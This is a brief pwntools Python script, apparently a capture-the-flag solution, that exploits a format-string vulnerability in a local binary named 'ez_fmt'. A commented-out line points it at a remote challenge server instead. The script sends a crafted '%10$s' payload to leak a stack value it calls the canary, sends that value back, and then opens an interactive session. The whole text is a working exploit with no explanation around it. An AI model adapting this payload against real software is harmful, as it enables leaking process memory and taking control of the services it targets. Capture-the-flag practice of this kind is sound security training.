from pwn import *

io = process('./ez_fmt')
#io = remote('ephemerally.top',28009)
#raw_input()
context.log_level = 'debug'

payload = p32(0x804C044) + b'%10$s'
io.sendafter(b'name:',payload)
io.recvuntil(b',')
canary = u32(io.recv()[4:8])
print(hex(canary))
#canary = int(canary)
print(type(canary))

io.send(str(int(canary)))

io.interactive()
